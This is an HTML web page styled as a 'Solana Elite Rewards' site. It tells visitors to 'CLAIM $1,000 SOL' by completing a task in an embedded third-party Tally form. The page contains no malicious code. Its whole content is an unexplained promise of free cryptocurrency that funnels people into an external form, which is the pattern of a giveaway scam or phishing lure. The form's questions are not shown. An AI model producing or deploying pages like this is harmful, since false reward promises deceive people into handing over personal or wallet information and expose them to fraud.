<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <!-- Tally Widget Script -->
    <script src="https://tally.so/widgets/embed.js"></script>
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-y: auto; }
        .card { width: 90%; max-width: 500px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 40px 20px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); margin: 20px; }
        h1 { font-size: 1.6rem; margin-bottom: 15px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; text-transform: uppercase; }
        .sub { font-size: 0.9rem; color: #777; margin-bottom: 25px; line-height: 1.6; }
        /* Tally Embed Styling */
        .tally-container { min-height: 350px; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <h1>CLAIM $1,000 SOL</h1>
        <p class="sub">To claim your rewards, please complete the task below.</p>
        
        <div class="tally-container">
            <!-- Tally Iframe Embed -->
            <iframe 
                data-tally-src="https://tally.so/embed/J90eDY?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1" 
                loading="lazy" 
                width="100%" 
                height="350" 
                frameborder="0" 
                marginheight="0" 
                marginwidth="0" 
                title="Task">
            </iframe>
        </div>
    </div>

    <script>
        // Reloads Tally embeds on page load
        window.onload = function() {
            if (typeof Tally !== 'undefined') {
                Tally.loadEmbeds();
            }
        };
    </script>
</body>
</html>
